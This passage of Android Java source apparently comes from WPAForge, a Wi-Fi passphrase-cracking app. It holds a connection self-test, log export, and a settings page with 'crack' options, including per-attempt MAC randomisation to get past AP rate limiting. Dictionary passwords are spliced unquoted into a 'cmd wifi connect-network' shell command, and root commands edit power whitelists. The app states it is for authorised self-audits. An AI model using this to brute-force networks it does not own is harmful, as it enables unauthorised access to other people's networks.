                String cur = io.github.wlmosv_png.wpaforge.audit.StatusParser.currentSsid(st0);
                sb.append(L.s("  当前连着: ", "  now connected to: "))
                        .append(cur == null ? L.s("（无）", "(none)") : cur).append('\n');
                if (ssid.equals(cur)) {
                    sb.append(L.s("  目标 = 当前连接，先断开…\n", "  target == current link, dropping...\n"));
                    try { sh.exec("cmd wifi set-wifi-enabled disabled", 8000); } catch (Throwable ignored) {}
                    try { Thread.sleep(1500); } catch (InterruptedException ignored) {}
                    try { sh.exec("cmd wifi set-wifi-enabled enabled", 8000); } catch (Throwable ignored) {}
                    try { Thread.sleep(2500); } catch (InterruptedException ignored) {}
                    String st1 = null;
                    try { st1 = sh.exec("cmd wifi status", 6000); } catch (Throwable ignored) {}
                    String cur1 = io.github.wlmosv_png.wpaforge.audit.StatusParser.currentSsid(st1);
                    sb.append(L.s("  断开后: ", "  after drop: "))
                            .append(cur1 == null ? L.s("（无）", "(none)") : cur1).append('\n');
                }

                // ── 步骤 5：发命令 ──
                sb.append(L.s("\n【5/6】发起连接\n", "\n[5/6] Connect\n"));
                String cmdOut = null;
                try {
                    cmdOut = sh.exec("cmd wifi connect-network " + ssid + " wpa2 " + pass, 15000);
                } catch (Throwable t) {
                    sb.append("  ✗ 命令异常: ").append(t.getClass().getSimpleName()).append('\n');
                }
                sb.append(L.s("  命令输出: ", "  output: "))
                        .append(cmdOut == null || cmdOut.trim().isEmpty() ? L.s("（无输出，正常）", "(none, normal)") : cmdOut.trim())
                        .append('\n');
                long newId = -1;
                String listDump = null;
                try {
                    listDump = sh.exec("cmd wifi list-networks", 5000);
                    newId = io.github.wlmosv_png.wpaforge.audit.ListNetworksParser.findNetId(listDump, ssid);
                } catch (Throwable ignored) {}
                sb.append(L.s("  新建配置 netId: ", "  new netId: ")).append(newId).append('\n');
                // 把保存列表完整打出来，便于定位「为什么找不到目标 netId」
                if (newId < 0) {
                    sb.append(L.s("  ⚠ 没找到目标配置，下面是 list-networks 完整输出:\n",
                            "  ! target config not found; full list-networks below:\n"));
                    if (listDump == null || listDump.trim().isEmpty()) {
                        sb.append("    (空)\n");
                    } else {
                        for (String ln : listDump.split("\n")) {
                            sb.append("    ").append(ln).append('\n');
                        }
                    }
                    // 同时报一下我们输入的 SSID 的字节形态（长度 + 是否有空格）
                    sb.append("  输入 SSID = [").append(ssid).append("] 长度=")
                            .append(ssid.length())
                            .append(" 含空格=").append(ssid.contains(" "))
                            .append("\n");
                }

                // ── 步骤 6：观察 15 秒 ──
                sb.append(L.s("\n【6/6】观察 15 秒\n", "\n[6/6] Watching 15s\n"));
                boolean hit = false;
                for (int i = 0; i < 30; i++) {
                    try { Thread.sleep(500); } catch (InterruptedException ignored) {}
                    String st = null;
                    try { st = sh.exec("cmd wifi status", 5000); } catch (Throwable ignored) {}
                    if (st == null) continue;
                    io.github.wlmosv_png.wpaforge.audit.SupplicantParser.Info info =
                            io.github.wlmosv_png.wpaforge.audit.SupplicantParser.parse(st);
                    if (info.raw && (i % 4 == 0 || info.isTargetConnected(ssid))) {
                        sb.append("  t=").append((i * 500) / 1000.0).append("s  ")
                                .append(info.ssid == null ? "-" : info.ssid)
                                .append(" / ").append(info.state == null ? "-" : info.state)
                                .append(" / ").append(info.ip == null ? "-" : info.ip)
                                .append(" / netId=").append(info.netId).append('\n');
                    }
                    if (info.isTargetConnected(ssid)) { hit = true; break; }
                }
                sb.append('\n');
                if (hit) {
                    sb.append(L.s("结论: ✓ 握手完成并拿到 IP —— 这个密码是对的，判定没问题。\n",
                            "Result: handshake completed and IP obtained - passphrase is correct.\n"));
                } else {
                    sb.append(L.s("结论: ✗ 15 秒内目标从未「握手完成 + 拿到 IP」。\n",
                            "Result: target never reached handshake-complete within 15s.\n"));
                    sb.append(L.s("  这说明系统确实没连上（密码不符 / 信号太弱 / 安全类型不匹配）。\n",
                            "  The system genuinely failed to connect (wrong passphrase / weak signal / security mismatch).\n"));
                }
                } finally {
                    // ── 收尾还原（最终审计 P0-1）──
                    // 无论成功、失败、中断还是异常，都必须走到这里；与启动补做共用同一把锁，
                    // 所以不会和服务的收尾恢复并发操作同一份 journal / 同一个目标配置。
                    sb.append(L.s("\n【还原】正在恢复目标原始配置…\n",
                            "\n[restore] restoring original config...\n"));
                    try {
                        io.github.wlmosv_png.wpaforge.audit.RestorePlan.Outcome o =
                                io.github.wlmosv_png.wpaforge.audit.RestoreRunner.runExclusiveForTask(
                                        guardEntry, testTaskId,
                                        io.github.wlmosv_png.wpaforge.audit.ConfigRestorer::restore);
                        if (o == null) {
                            sb.append(L.s("  ⚠ 本次未执行还原: ", "  ! restore not run: "))
                                    .append(io.github.wlmosv_png.wpaforge.audit.RestoreRunner.lastSummary())
                                    .append('\n');
                        } else {
                            sb.append("  ").append(o.summary()).append('\n');
                            if (!o.restored) {
                                sb.append(L.s("  ⚠ 原配置未确认还原：请手动重连该网络（口令可能需要重输）\n",
                                        "  ! original config not confirmed: reconnect manually\n"));
                            }
                        }
                    } catch (Throwable t) {
                        sb.append(L.s("  ✗ 还原异常: ", "  x restore threw: "))
                                .append(t.getClass().getSimpleName()).append('\n');
                    }
                }
            } else if (sh != null) {
                sb.append(L.s("\n【跳过】未通过保护检查，本次不执行任何会改动网络配置的步骤。\n",
                        "\n[skipped] guard failed - no config-touching steps were run.\n"));
            }

            final String body = sb.toString();
            ui.post(() -> new NetDialog(MainActivity.this,
                    L.s("连接自测结果", "Connection test result"), body)
                    .setPositive(L.s("知道了", "Got it"), null).show());
        }, "wpaforge-conntest").start();
    }

    /** 把日志复制到 Download 目录（应用私有目录不好进）。 */
    private void exportLog() {
        new Thread(() -> {
            java.io.File f = null;
            try {
                android.content.Intent it = new android.content.Intent(this,
                        io.github.wlmosv_png.wpaforge.CrackService.class);
                it.setAction("io.github.wlmosv_png.wpaforge.EXPORT_LOG");
                startService(it);
            } catch (Throwable ignored) {}
            // 直接也自己复制一份（不依赖服务活着）
            try {
                java.io.File dir = getExternalFilesDir("logs");
                java.io.File[] all = dir == null ? null : dir.listFiles();
                if (all != null && all.length > 0) {
                    java.io.File newest = null;
                    for (java.io.File x : all) {
                        if (!x.getName().startsWith("WPAForge-log-")) continue;
                        if (newest == null || x.lastModified() > newest.lastModified()) newest = x;
                    }
                    if (newest != null) {
                        java.io.File out = new java.io.File(
                                android.os.Environment.getExternalStoragePublicDirectory(
                                        android.os.Environment.DIRECTORY_DOWNLOADS),
                                newest.getName());
                        java.io.FileInputStream in = new java.io.FileInputStream(newest);
                        java.io.FileOutputStream os = new java.io.FileOutputStream(out);
                        byte[] b = new byte[8192];
                        int n;
                        while ((n = in.read(b)) > 0) os.write(b, 0, n);
                        in.close();
                        os.close();
                        f = out;
                    }
                }
            } catch (Throwable ignored) {}
            final java.io.File res = f;
            final String privPath = getExternalFilesDir("logs") == null
                    ? "（私有目录不可用）" : getExternalFilesDir("logs").getAbsolutePath();
            ui.post(() -> {
                String msg;
                if (res != null) {
                    msg = L.s("已导出:\n" + res.getAbsolutePath()
                                    + "\n\n全部日志在:\n" + privPath,
                            "Exported to:\n" + res.getAbsolutePath()
                                    + "\n\nAll logs in:\n" + privPath);
                } else {
                    msg = L.s("导出失败（可能没有存储权限）。\n\n日志目录:\n" + privPath,
                            "Export failed (no storage permission?).\n\nLog dir:\n" + privPath);
                }
                new NetDialog(MainActivity.this, L.s("导出日志", "Export log"), msg)
                        .setPositive(L.s("知道了", "Got it"), null).show();
            });
        }, "wpaforge-exportlog").start();
    }

    /** 连接选项两个开关的文案刷新 */
    private void refreshConnOptions() {
        if (connPinBtn == null || connRotBtn == null) return;
        connPinBtn.setText(Prefs.pinBssid(this)
                ? L.s("锁定 AP：开（-b 指定 BSSID）", "Pin AP: on (-b BSSID)")
                : L.s("锁定 AP：关（由系统选择 AP）", "Pin AP: off (system picks)"));
        connRotBtn.setText(Prefs.macRotate(this)
                ? L.s("更换随机 MAC：开（每次尝试换一个）", "Random MAC: on (new one per attempt)")
                : L.s("更换随机 MAC：关（沿用系统策略）", "Random MAC: off (system default)"));
    }

    /**
     * 设置页 —— 2026-10-24 重排。
     *
     * <h3>为什么重排</h3>
     * 改版前是「一个说明块接一个胶囊按钮」交替往下堆：同类的东西不在同一块里，
     * 组与组之间也没有边界，往下滚像一串散装控件（用户原话："设置页面很乱"）。
     * 现在统一成：**琥珀小节标题 + 一张卡装下该组的全部行**，行与行之间一条极淡分隔线；
     * 卡内的操作行是**扁平整行**（左标题 + 右 ›），不再是浮在页面上的大胶囊按钮。
     *
     * <h3>逐字未动</h3>
     * 每个设置键、默认值、点击回调、确认条件、读写方式与改版前完全相同
     * （PIN 的两条分支、一键修复的白名单命令、连接自测与导出日志的入口都原样保留）。
     */
    private void buildSettingsTab() {
        if (radar != null) radar.stopSpin();

        // ---------------- 执行通道 ----------------
        pageSettings.addView(sectionLabel(L.s("执行通道", "Execution channel")));
        LinearLayout modeCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);

        modeInfo = new TextView(this);
        modeInfo.setTextSize(AmberTheme.FS_BODY);
        modeInfo.setTextColor(TEXT);
        modeInfo.setLineSpacing(px(4), 1f);
        modeCard.addView(modeInfo);

        modeReadyLabel = new TextView(this);
        modeReadyLabel.setTextSize(AmberTheme.FS_BODY);
        modeReadyLabel.setTextColor(TEXT_DIM);
        modeReadyLabel.setLineSpacing(px(4), 1f);
        modeCard.addView(groupDivider(12));
        modeCard.addView(modeReadyLabel, topGap(10));

        // 点一下重测 / 长按看证据 —— 这两个交互以前完全不可发现，这里直接写出来。
        TextView modeHint = new TextView(this);
        modeHint.setText(L.s("点一下重新检测 · 长按看完整检测证据",
                "Tap to re-check · long-press for full evidence"));
        modeHint.setTextSize(AmberTheme.FS_LABEL);
        modeHint.setTextColor(AmberTheme.TEXT_FAINT);
        modeCard.addView(modeHint, topGap(8));
        pageSettings.addView(modeCard);
        refreshModeReady();
        fillModeInfo();

        // ---------------- 语言 ----------------
        pageSettings.addView(sectionLabel(L.s("语言", "Language")));
        LinearLayout langCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        languageBtn = rowAction("");
        languageBtn.setOnClickListener(v -> showLanguagePicker());
        langCard.addView(languageBtn);
        pageSettings.addView(langCard);
        refreshLanguageRow();

        // ---------------- 权限 ----------------
        pageSettings.addView(sectionLabel(L.s("权限", "Permissions")));
        LinearLayout permCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        permLabel = new TextView(this);
        permLabel.setTextSize(AmberTheme.FS_BODY);
        permLabel.setTextColor(TEXT_DIM);
        permLabel.setLineSpacing(px(5), 1f);
        permCard.addView(permLabel);
        refreshPermLabel();

        // 权限在启动时已自动申请过，这里不再放手动申请按钮 ——
        // 放一个「申请缺失的权限」会让人以为不点就不给。
        // 只有「已被永久拒绝」（系统不再弹窗）时才给一个去处。
        permFixBtn = rowAction(L.s("去系统设置里允许", "Allow in system settings"));
        permFixBtn.setOnClickListener(v -> openAppSettings());
        permFixBtn.setVisibility(View.GONE);
        permCard.addView(groupDivider(10));
        permCard.addView(permFixBtn);
        pageSettings.addView(permCard);

        // ---------------- 保活状态 ----------------
        pageSettings.addView(sectionLabel(L.s("保活状态", "Keep-alive status")));
        LinearLayout aliveCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        keepAliveLabel = new TextView(this);
        keepAliveLabel.setTextSize(AmberTheme.FS_BODY);
        keepAliveLabel.setTextColor(TEXT_DIM);
        keepAliveLabel.setLineSpacing(px(5), 1f);
        aliveCard.addView(keepAliveLabel);
        refreshKeepAlive();

        Button fixAlive = rowAction(L.s("一键修复：写入系统白名单", "Fix now: write system whitelists"));
        fixAlive.setOnClickListener(v -> {
            Toast.makeText(this, L.s("正在写入…", "writing…"), Toast.LENGTH_SHORT).show();
            new Thread(() -> {
                final StringBuilder err = new StringBuilder();
                try {
                    String pkg = getPackageName();
                    io.github.wlmosv_png.wpaforge.audit.RootProber.exec(this,
                            new String[]{"su", "-c", "dumpsys deviceidle whitelist +" + pkg}, 8000);
                    String cur = io.github.wlmosv_png.wpaforge.audit.RootProber.exec(this,
                            new String[]{"su", "-c",
                                    "settings get global lspdoze.deepsleep.whitelist"}, 6000);
                    if (cur != null && !cur.contains(pkg)) {
                        String merged = cur.trim().isEmpty() ? pkg : cur.trim() + "," + pkg;
                        io.github.wlmosv_png.wpaforge.audit.RootProber.exec(this,
                                new String[]{"su", "-c",
                                        "settings put global lspdoze.deepsleep.whitelist '" + merged + "'"},
                                6000);
                    }
                } catch (Throwable t) {
                    err.append(t);
                }
                ui.post(() -> {
                    refreshKeepAlive();
                    Toast.makeText(this, err.length() == 0
                                    ? L.s("已写入系统白名单", "whitelists updated")
                                    : L.s("写入失败（需要 root）", "failed (root required)"),
                            Toast.LENGTH_SHORT).show();
                });
            }, "wpaforge-fix-alive").start();
        });
        aliveCard.addView(groupDivider(12));
        aliveCard.addView(fixAlive);
        pageSettings.addView(aliveCard);

        // ---------------- 诊断 ----------------
        pageSettings.addView(sectionLabel(L.s("诊断", "Diagnostics")));
        LinearLayout diagCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        TextView diagHint = new TextView(this);
        diagHint.setText(L.s(
                "连不上 / 判不出时，先用这里定位：\n"
                + "· 完整自检（长按上面那行「执行方式」）看环境\n"
                + "· 连接自测：真发一次连接命令，逐层报告判定过程\n"
                + "· 导出日志：把运行日志复制到 Download 目录，直接发出来",
                "When it fails, locate the cause here:\n"
                + "· Self-check (long-press the execution-mode line above)\n"
                + "· Connection test: really send one connect command and report layer by layer\n"
                + "· Export log: copy the run log to Download for sharing"));
        diagHint.setTextSize(AmberTheme.FS_BODY);
        diagHint.setTextColor(TEXT_DIM);
        diagHint.setLineSpacing(px(5), 1f);
        diagCard.addView(diagHint);

        Button connTest = rowAction(L.s("连接自测（发一次真实连接命令）",
                "Connection test (send one real connect)"));
        connTest.setOnClickListener(v -> showConnTestDialog());
        diagCard.addView(groupDivider(10));
        diagCard.addView(connTest);

        Button exportLog = rowAction(L.s("导出日志到 Download", "Export log to Download"));
        exportLog.setOnClickListener(v -> exportLog());
        diagCard.addView(groupDivider(4));
        diagCard.addView(exportLog);
        pageSettings.addView(diagCard);

        // ---------------- 应用锁 ----------------
        pageSettings.addView(sectionLabel(L.s("应用锁", "App lock")));
        LinearLayout lockCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        Button pinBtn = rowAction(L.s("PIN 锁", "PIN lock"));
        pinBtn.setOnClickListener(v -> {
            if (Prefs.pinEnabled(this)) {
                // 已设置 → 提供修改 / 清除
                new android.app.AlertDialog.Builder(this)
                        .setTitle(L.s("PIN 锁已开启", "PIN lock is on"))
                        .setItems(new String[]{
                                L.s("修改 PIN", "Change PIN"),
                                L.s("清除 PIN", "Remove PIN")}, (d, w) -> {
                            if (w == 0) showPinSetup();
                            else confirmClearPin();
                        })
                        .setNegativeButton(L.s("取消", "Cancel"), null)
                        .show();
            } else {
                showPinSetup();
            }
        });
        lockCard.addView(pinBtn);

        TextView pinHint = new TextView(this);
        pinHint.setText(L.s("设置后每次打开应用都要先输入 PIN 才能进入。",
                "Once set, the PIN must be entered each time the app is opened."));
        pinHint.setTextSize(AmberTheme.FS_BODY);
        pinHint.setTextColor(TEXT_DIM);
        pinHint.setLineSpacing(px(5), 1f);
        lockCard.addView(groupDivider(6));
        lockCard.addView(pinHint, topGap(8));
        pageSettings.addView(lockCard);

        // ---------------- 连接选项 ----------------
        pageSettings.addView(sectionLabel(L.s("连接选项", "Connection options")));
        LinearLayout connCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        connPinBtn = rowActionPlain("");
        connPinBtn.setOnClickListener(v -> {
            Prefs.setPinBssid(this, !Prefs.pinBssid(this));
            refreshConnOptions();
            Toast.makeText(this, connPinBtn.getText(), Toast.LENGTH_SHORT).show();
        });
        connCard.addView(arrowRow(connPinBtn));

        connRotBtn = rowActionPlain("");
        connRotBtn.setOnClickListener(v -> {
            Prefs.setMacRotate(this, !Prefs.macRotate(this));
            refreshConnOptions();
            Toast.makeText(this, connRotBtn.getText(), Toast.LENGTH_SHORT).show();
        });
        connCard.addView(groupDivider(2));
        connCard.addView(arrowRow(connRotBtn));

        TextView connHint = new TextView(this);
        connHint.setText(L.s(
                "· 锁定 AP：同名 SSID 有多个 AP 时，只跟你在破解页选中的那一个打交道（默认交给系统挑）\n"
                + "· 更换随机 MAC：每次尝试换一个新 MAC，缓解目标 AP 限流；目标若做了 MAC 白名单，开着会连不上",
                "· Pin AP: when several APs share one SSID, talk only to the one you picked\n"
                + "· Random MAC: a new MAC per attempt eases AP rate limiting; breaks MAC-allowlisted targets"));
        connHint.setTextSize(AmberTheme.FS_BODY);
        connHint.setTextColor(TEXT_DIM);
        connHint.setLineSpacing(px(5), 1f);
        connCard.addView(groupDivider(8));
        connCard.addView(connHint, topGap(8));
        pageSettings.addView(connCard);
        refreshConnOptions();

        // ---------------- 破解设置 ----------------
        pageSettings.addView(sectionLabel(L.s("破解设置", "Crack settings")));
        TextView speedInfo = new TextView(this);
        speedInfo.setText(L.s("破解速度由目标路由器决定，实测约 1 秒/条。",
                        "Speed depends on the target router. Measured: about 1 second per attempt.")
                + " "
                + L.s("手机一次只能连一个网络，无法并行，这是 Android 的限制。",
                        "A phone can associate with only one network at a time — no parallelism. That is an Android limit."));
        speedInfo.setTextSize(AmberTheme.FS_BODY);
        speedInfo.setTextColor(TEXT_DIM);
        speedInfo.setLineSpacing(px(5), 1f);
        speedInfo.setBackground(AmberTheme.rowBg(this, dp, AmberTheme.RADIUS_CARD));
        speedInfo.setPadding(px(AmberTheme.PAD_H), px(AmberTheme.PAD_V),
                px(AmberTheme.PAD_H), px(AmberTheme.PAD_V));
        pageSettings.addView(speedInfo);

        // ---------------- 工具 ----------------
        pageSettings.addView(sectionLabel(L.s("工具", "Tools")));
        LinearLayout toolsCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        Button saved = rowAction(L.s("本机已存 WiFi 自查", "Inspect saved Wi-Fi"));
        saved.setOnClickListener(v -> showSavedWifi());
        toolsCard.addView(saved);

        Button hist = rowAction(L.s("破解记录", "Crack history"));
        hist.setOnClickListener(v -> showHistory());
        toolsCard.addView(groupDivider(2));
        toolsCard.addView(hist);

        Button exp = rowAction(L.s("导出记录", "Export records"));
        exp.setOnClickListener(v -> doExport());
        toolsCard.addView(groupDivider(2));
        toolsCard.addView(exp);

        // 迁移遗留的明文备份：**只在存在时**出现一行，删不删由用户定（P0-2）。
        // 不做自动清理：那是数据销毁，且会同时丢掉唯一的回滚依据。
        java.io.File[] plainBaks =
                io.github.wlmosv_png.wpaforge.audit.PlaintextMigration.backupsIn(getFilesDir());
        if (plainBaks.length > 0) {
            long bytes = 0;
            for (java.io.File f : plainBaks) bytes += f.length();
            plainBakBtn = rowAction(L.f("清理明文备份（%d 个 · %.1f KB）",
                    "Purge plaintext backups (%d files, %.1f KB)",
                    plainBaks.length, bytes / 1024.0));
            plainBakBtn.setOnClickListener(v -> confirmPurgePlaintextBackups());
            toolsCard.addView(groupDivider(2));
            toolsCard.addView(plainBakBtn);
        }
        pageSettings.addView(toolsCard);

        // ---------------- 使用边界 ----------------
        pageSettings.addView(sectionLabel(L.s("使用边界", "Scope of use")));
        pageSettings.addView(infoBlock(L.s("仅对自己有授权的网络使用", "Use only on networks you are authorised for"),
                L.s("破解会向目标 AP 发起真实的关联请求。对自有网络是自查，", "WPAForge issues real association requests. On your own network that is a self-audit;")
                + L.s("对未授权网络是违法行为，且路由器侧会留下失败记录。", "on an unauthorised network it is unlawful, and the AP will log the failures.")));

        pageSettings.addView(infoBlock(L.s("关于速度", "About speed"),
                L.s("逐条连接受目标响应速度限制，快的 AP 约 1 秒，慢的可能 5 秒以上。", "Each attempt waits on the target. A fast AP takes ~1s, a slow one 5s or more.")
                + L.s("字典越大耗时越久 —— 建议先用目标派生 + 智能排序，几百条往往比十万条有效。", "Bigger dictionaries take longer — target derivation plus smart ranking makes a few hundred entries beat a hundred thousand.")));

        // ---------------- 版本 ----------------
        pageSettings.addView(sectionLabel(L.s("版本", "Version")));
        LinearLayout verCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        TextView ver = new TextView(this);
        ver.setText(Ver.labeled(this));
        ver.setTextSize(AmberTheme.FS_BODY);
        ver.setTextColor(TEXT_DIM);
        verCard.addView(ver);

        Button toAuthor = rowAction(L.s("关于我 / 我的其它项目", "About me / my other projects"));
        toAuthor.setOnClickListener(v ->
                startActivity(new android.content.Intent(this, AboutActivity.class)));
        verCard.addView(groupDivider(10));
        verCard.addView(toAuthor);
        pageSettings.addView(verCard);
    }

    /** 组内分隔线（上方留白由调用方给）。 */
    private View groupDivider(int topGapDp) {
        LinearLayout wrap = new LinearLayout(this);
        wrap.setOrientation(LinearLayout.VERTICAL);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.topMargin = px(topGapDp);
        wrap.setLayoutParams(lp);
        wrap.addView(AmberTheme.divider(this, dp));
        return wrap;
    }

    /** 一个带上方间距的行容器参数。 */
    private LinearLayout.LayoutParams topGap(int dpValue) {
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.topMargin = px(dpValue);
        return lp;
    }

    /**
     * 扁平设置行：整行可点、无自有底色、左标题 + 右 ›。
     *
     * <p>改版前这里清一色是「大胶囊按钮」：一整页十几个按钮浮在页面上，
     * 每个都像主操作，页面自然乱。行式结构把所有操作压成同一高度，
     * 层级只由分组标题和小节顺序表达。
     */
    private Button rowAction(String label) {
        return rowActionPlain(label + "   ›");
    }

    /** 同 {@link #rowAction}，但文字里不带箭头（文字会动态变化的那种行用，
     *  箭头由 {@link #arrowRow} 单独补一个，免得动态文字把箭头覆盖掉）。 */
    private Button rowActionPlain(String label) {
        Button b = new Button(this);
        b.setText(label);
        b.setAllCaps(false);
        b.setTextSize(AmberTheme.FS_BODY + 1f);
        b.setTextColor(TEXT);
        b.setGravity(Gravity.START | Gravity.CENTER_VERTICAL);
        b.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        b.setStateListAnimator(null);
        b.setMinWidth(0);
        b.setMinimumWidth(0);
        b.setMinHeight(0);
        b.setMinimumHeight(0);
        b.setPadding(0, px(13), 0, px(13));
        b.setBackground(io.github.wlmosv_png.wpaforge.ui.UiKit.ripple(
                AmberTheme.CARD, dp(AmberTheme.RADIUS_CHIP)));
        b.setLayoutParams(new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));
        io.github.wlmosv_png.wpaforge.ui.UiKit.enableTapHaptic(b);
        return b;
    }

    /** 把操作按钮包成一行：按钮占满、右端一个 ›（用于文字会变化的行）。 */
    private LinearLayout arrowRow(Button b) {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setGravity(Gravity.CENTER_VERTICAL);
        b.setLayoutParams(new LinearLayout.LayoutParams(0,
                ViewGroup.LayoutParams.WRAP_CONTENT, 1f));
        row.addView(b);
        TextView arrow = new TextView(this);
        arrow.setText("›");
        arrow.setTextSize(AmberTheme.FS_TITLE);
        arrow.setTextColor(AmberTheme.TEXT_FAINT);
        arrow.setPadding(px(6), 0, 0, 0);
        row.addView(arrow);
        return row;
    }

    /** 语言行的文字（点开选择器后由 refreshLanguageRow 刷新）。 */
    /**
     * 清理明文备份的确认框（P0-2）。
     *
     * <p>三件事必须说清楚，不能含糊：① 里面是什么（含**明文**口令的迁移前旧文件）；
     * ② 删了之后失去什么（唯一回滚依据；当前文件已是脱敏+密文，功能不受影响）；
     * ③ **不承诺彻底清除** —— 删除只是摘目录项，闪存层面是否残留不由应用决定。
     */
    private void confirmPurgePlaintextBackups() {
        io.github.wlmosv_png.wpaforge.ui.NetDialog d = new io.github.wlmosv_png.wpaforge.ui.NetDialog(
                this, L.s("清理明文备份", "Purge plaintext backups"),
                L.s("这两个文件是「明文口令 → 密文」迁移之前留下的整份拷贝，"
                                + "里面**含明文口令**（应用私有目录 0600，别的应用读不到）。\n\n"
                                + "保留它们的唯一理由是回滚：万一当初的迁移把文件写坏，还能拿它顶回去。"
                                + "当前的历史与队列已经是「脱敏标签 + Keystore 密文」，功能不受影响。\n\n"
                                + "删除后不再有回滚依据。注意：删除不等于在闪存层面被彻底抹除 —— "
                                + "这只是摘掉目录项，物理介质是否残留由主控决定，应用无法保证。",
                        "These two files are the pre-migration copies and contain **plaintext** "
                                + "passphrases (app-private dir, mode 0600).\n\n"
                                + "They are kept only as a rollback path in case that migration "
                                + "corrupted a file; the live files are tag + Keystore-sealed now.\n\n"
                                + "Deleting removes the rollback path. Note: deletion does not "
                                + "guarantee forensic erasure on flash - that is up to the controller."));
        d.setDanger(L.s("删除这两个文件", "Delete both files"), dd -> {
            int n = io.github.wlmosv_png.wpaforge.audit.PlaintextMigration.purgeIn(getFilesDir());
            if (plainBakBtn != null) {
                plainBakBtn.setText(n > 0
                        ? L.s("明文备份已清理", "Plaintext backups purged")
                        : L.s("清理失败（文件仍在）", "purge failed (files remain)"));
                plainBakBtn.setEnabled(false);
            }
            Toast.makeText(this, n > 0
                    ? L.s("已删除 " + n + " 个明文备份", "Deleted " + n + " plaintext backup(s)")
                    : L.s("没有删除成功", "Nothing deleted"), Toast.LENGTH_LONG).show();
        });
        d.setNegative(L.s("保留", "Keep"), null);
        d.show();
    }

    private void refreshLanguageRow() {
        if (languageBtn == null) return;
        languageBtn.setText(L.f("语言 · 当前 %s", "Language · currently %s",
                L.modeLabel(this)) + "   ›");
    }

    /** 圆角胶囊按钮 */
    private Button makeButton(String label, int color) {
        Button b = new Button(this);
        b.setText(label);
        b.setAllCaps(false);
        b.setTextSize(15);
        b.setTextColor(isLight(color) ? AmberTheme.ON_ACCENT : Color.WHITE);
        b.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        b.setPadding(px(20), px(14), px(20), px(14));
        b.setMinHeight(0);
        b.setMinimumHeight(0);
        b.setStateListAnimator(null);
        b.setBackground(roundBg(color, AmberTheme.RADIUS_BTN));
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.topMargin = px(5);
        lp.bottomMargin = px(11);
        b.setLayoutParams(lp);
        io.github.wlmosv_png.wpaforge.ui.UiKit.enableTapHaptic(b);
        return b;
    }

    /**
     * 主操作按钮：实心琥珀，深色字。
     * 一屏里只该出现一个。
     */
    private Button btnPrimary(String label) {
        Button b = makeButton(label, ACCENT);
        b.setTextColor(ON_ACCENT);
        return b;
    }

    /**
     * 次操作按钮：暗底 + 淡描边，浅色字。
     * 设置页那一串都用这个，视觉上让位给主操作。
     */
    private Button btnSecondary(String label) {
        Button b = makeButton(label, BTN_2ND_BG);
        b.setTextColor(TEXT);
        b.setBackground(roundBgStroked(BTN_2ND_BG, BTN_2ND_EDGE, AmberTheme.RADIUS_BTN, 0.8f));
        return b;
    }

    /** 危险按钮：暗底 + 红字。只给「会丢东西」的动作。 */
    private Button btnDanger(String label) {
        Button b = btnSecondary(label);
        b.setTextColor(DANGER);
        b.setBackground(roundBgStroked(AmberTheme.DANGER_SOFT_BG,
                AmberTheme.DANGER_EDGE, AmberTheme.RADIUS_BTN, 0.8f));
        return b;
    }

    private boolean isLight(int color) {
        int r = (color >> 16) & 0xFF, g = (color >> 8) & 0xFF, b = color & 0xFF;
        return (r * 299 + g * 587 + b * 114) / 1000 > 150;
    }

    /** 信息块 */
    private View infoBlock(String title, String body) {
        LinearLayout box = new LinearLayout(this);
        box.setOrientation(LinearLayout.VERTICAL);
        box.setBackground(roundBgStroked(SURFACE, AmberTheme.EDGE, AmberTheme.RADIUS_CARD, 0.8f));
        box.setPadding(px(18), px(16), px(18), px(16));
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.bottomMargin = px(8);
        box.setLayoutParams(lp);

        TextView t = new TextView(this);
        t.setText(title);
        t.setTextSize(13);
        t.setTextColor(ACCENT);
        box.addView(t);

        TextView b = new TextView(this);
        b.setText(body);
        b.setTextSize(12);
        b.setTextColor(TEXT_DIM);
        b.setLineSpacing(px(4), 1f);
        b.setPadding(0, px(6), 0, 0);
        box.addView(b);
        return box;
    }

    /** 次级按钮（中等宽度，胶囊） */
    private Button secondaryButton(String label, int color) {
        Button b = new Button(this);
        b.setText(label);
        b.setAllCaps(false);
        b.setTextSize(14);
        b.setTextColor(color);
        b.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        b.setBackground(roundBg(AmberTheme.CARD_3, AmberTheme.RADIUS_CHIP));
        b.setMinWidth(0); b.setMinimumWidth(0);
        b.setMinHeight(0); b.setMinimumHeight(0);
        b.setStateListAnimator(null);
        b.setPadding(px(14), px(13), px(14), px(13));
        return b;
    }

    /** 两列等分布局参数 */
    private LinearLayout.LayoutParams twoColParams(int rightMargin) {
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        lp.rightMargin = px(rightMargin);
        lp.bottomMargin = px(4);
        return lp;
    }

    /** 三列等分布局（比两列窄，用于三个模式按钮并排） */
    private LinearLayout.LayoutParams thirdColParams(int rightMargin) {
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
